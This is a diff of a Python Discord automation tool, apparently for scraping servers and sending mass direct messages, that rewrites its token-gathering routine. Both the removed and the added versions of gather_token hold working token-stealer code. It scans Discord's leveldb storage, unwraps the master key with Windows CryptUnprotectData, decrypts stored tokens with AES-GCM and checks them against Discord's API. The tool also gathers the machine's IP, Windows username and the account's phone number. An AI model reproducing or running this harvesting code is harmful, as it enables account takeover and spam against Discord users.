@@ -3,6 +3,11 @@ from json import loads, dumps
 from colorama import *
 from urllib.request import Request, urlopen
 from json import loads, dumps
+import urllib.request, urllib.error
+from Crypto.Cipher import AES
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from json import loads as json_loads, load
+from urllib.request import Request, urlopen
 
 header,requests_url,modules, missing_modules,proxy_list,id_list, guild_list,guild_scrap,channel_scrap,user_scrap,message_sent=modules = { 'Cookie': '__dcfduid=30b25b30bdb811eca9acdd9d360ada08','Content-Type': 'application/json','x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJkaXNjb3JkLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6ImRpc2NvcmQuY29tIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYwNjQ1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='},{'proxies' : 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','ip' : "http://ipinfo.io/json",'user' : 'https://discord.com/api/v6/users/@me','private_channel' : "https://discord.com/api/v9/users/@me/channels",'guild' : "https://discord.com/api/v9/users/@me/guilds",'guild_channel' : 'https://discord.com/api/v8/guilds/{guild_id}/channels','channel_content' : 'https://discord.com/api/v8/channels/{channel_id}/messages','message' : 'https://discord.com/api/v9/channels/{id}/messages','up_channel' : 'https://discord.com/api/v8/users/@me/channels'},['urllib.request','Crypto.Cipher','ctypes','json','colorama'],[],[],[],[],0,0,0,0
 
@@ -25,171 +30,85 @@ def gather_modules():
             for module in missing_modules:installing_module_prompt(module)
         else:modules_install_prompt()
     installed_modules()
-
 def gather_proxy():
     for proxy in requests.get(requests_url['proxies']).text.splitlines():proxy_list.append(proxy)
     return len(proxy_list)
-
 def getheaders(token):
     headers = {"Content-Type": "application/json",'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'}
     if token: headers.update({"Authorization": token});return headers
-
 def gather_token():
-
-    import urllib.request, urllib.error
-    from Crypto.Cipher import AES
-    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-    from json import loads as json_loads, load
-    from urllib.request import Request, urlopen
-    
-    def get_all():
-        return get_tokens()
-    
     def DecryptValue(buff, master_key=None):
-        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-        if starts == 'v10' or starts == 'v11':
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-    
+        starts, iv, payload = buff.decode(errors='ignore')[:3], buff[3:15], buff[15:]
+        if starts in ('v10', 'v11'):cipher = AES.new(master_key, AES.MODE_GCM, iv);return cipher.decrypt(payload)[:-16].decode()
     class DATA_BLOB(Structure):
-        _fields_ = [
-            ('cbData', wintypes.DWORD),
-            ('pbData', POINTER(c_char))
-        ]
-    
+        _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]
     def GetData(blob_out):
-        cbData = int(blob_out.cbData)
-        pbData = blob_out.pbData
+        cbData, pbData = int(blob_out.cbData), blob_out.pbData
         buffer = c_buffer(cbData)
         cdll.msvcrt.memcpy(buffer, pbData, cbData)
         windll.kernel32.LocalFree(pbData)
         return buffer.raw
-    
     def CryptUnprotectData(encrypted_bytes, entropy=b''):
-        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-        buffer_entropy = c_buffer(entropy, len(entropy))
-        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
-        blob_out = DATA_BLOB()
-    
-        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
-            return GetData(blob_out)
-    
-    def get_tokens():
-        tokens = []
-        LOCAL = os.getenv("LOCALAPPDATA")
-        ROAMING = os.getenv("APPDATA")
-        PATHS = {
-            "Discord": ROAMING + "\\Discord"
-        }
-        def search(path: str) -> list:
-            path += "\\Local Storage\\leveldb"
-            found_tokens = []
-            if os.path.isdir(path):
-                for file_name in os.listdir(path):
-                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                        continue
-                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
-                            for token in re.findall(regex, line):
-                                try: 
-                                    urllib.request.urlopen(urllib.request.Request(
-                                        "https://discord.com/api/v9/users/@me",
-                                        headers={
-                                            'content-type': 'application/json', 
-                                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
-                                            'authorization': token
-                                        }
-                                    ))
-                                except urllib.error.HTTPError as e:
-                                    continue
-                                if token not in found_tokens and token not in tokens:
-                                    found_tokens.append(token)
-            return found_tokens
-        
-        def encrypt_search(path):
-            if not os.path.exists(f"{path}/Local State"): return []
-            pathC = path + "\\Local Storage\\leveldb"
-            found_tokens = []
-            pathKey = path + "/Local State"
-            with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
-            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-            master_key = CryptUnprotectData(master_key[5:])
-    
-            for file in os.listdir(pathC):
-                if file.endswith(".log") or file.endswith(".ldb")   :
-                    for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
-                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                            tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
-                            try: 
-                                urllib.request.urlopen(urllib.request.Request(
-                                    "https://discord.com/api/v9/users/@me",
-                                    headers={
-                                        'content-type': 'application/json', 
-                                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
-                                        'authorization': tokenDecoded
-                                    }
-                                ))
-                            except urllib.error.HTTPError as e:
-                                continue
-                            if tokenDecoded not in found_tokens and tokenDecoded not in tokens:
-                                found_tokens.append(tokenDecoded)
-            return found_tokens
-        for path in PATHS:
-            for token in search(PATHS[path]):
-                tokens.append(token)
-            for token in encrypt_search(PATHS[path]):
-                tokens.append(token)
-        return tokens
-    return get_tokens()[0]
+        buffer_in, buffer_entropy = c_buffer(encrypted_bytes, len(encrypted_bytes)), c_buffer(entropy, len(entropy))
+        blob_in, blob_entropy, blob_out = DATA_BLOB(len(encrypted_bytes), buffer_in), DATA_BLOB(len(entropy), buffer_entropy), DATA_BLOB()
+        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):return GetData(blob_out)
+    PATHS,tokens = {"Discord": os.getenv("APPDATA") + "\\Discord"}, []
+    def search(path: str) -> list:
+        found_tokens = []
+        for file_name in os.listdir(f"{path}\\Local Storage\\leveldb"):
+            if not file_name.endswith((".log", ".ldb")):continue
+            for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
+                    for token in re.findall(regex, line):
+                        try: urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v9/users/@me", headers={'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11', 'authorization': token}))
+                        except urllib.error.HTTPError as e: continue
+                        if token not in found_tokens and token not in tokens:found_tokens.append(token)
+        return found_tokens
+    def encrypt_search(path):
+        found_tokens = []
+        if not os.path.exists(f"{path}/Local State"): return []
+        with open(f"{path}/Local State", 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
+        master_key = CryptUnprotectData(base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:])
+        for file in os.listdir(f"{path}\\Local Storage\\leveldb"):
+            if file.endswith((".log", ".ldb")):
+                for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb\\{file}", errors="ignore").readlines() if x.strip()]:
+                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                        try: urllib.request.urlopen(urllib.request.Request(requests_url['user'], headers={'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11', 'authorization': tokenDecoded}))
+                        except urllib.error.HTTPError as e: continue
+                        if tokenDecoded not in found_tokens and tokenDecoded not in tokens:found_tokens.append(tokenDecoded)
+        return found_tokens
+    for path in PATHS:tokens += search(PATHS[path]) + encrypt_search(PATHS[path]);return tokens[0]
 
 def gather_ip():
     return requests.get(requests_url['ip']).json()['ip']
-
 def gather_user():
     return os.getenv('USERNAME')
-
 def used():
     return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
 def gather_discord_username(token):
     return requests.get(requests_url['user'], headers=getheaders(token)).json()['username']
-
 def gather_discord_phone(token):
     return requests.get(requests_url['user'], headers=getheaders(token)).json()['phone']
-
 def set_console_title(title):
     os.system(f'title "{title}"')
-
 def input_prompt():
     return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}?{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'
-
 def print_prompt():
     return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}!{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'
-
 def is_path_exist(token):
     for path in os.listdir(absolute_path()):
         if path == f'{gather_discord_username(token=token)}.json': os.remove(path)
-
 def absolute_path():
     return os.path.dirname(os.path.abspath(__file__))
-
 def get_user_info(token):
     return requests.get(requests_url['user'], headers=getheaders(token)).json()
-
 def write_info(token):
     is_path_exist(token=token)
     with open(f'{gather_discord_username(token=token)}.json', 'w') as file:json.dump(get_user_info(token=token), file, indent=4)
-
 def check_token(token):
-        
     if requests.get(requests_url['user'], headers=getheaders(token)).status_code == 200:pass
     else:print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.RED} Wrong token !');input();exit()
-
 def Mass_Dm():  
 
     global guild_scrap,channel_scrap,user_scrap,message_sent
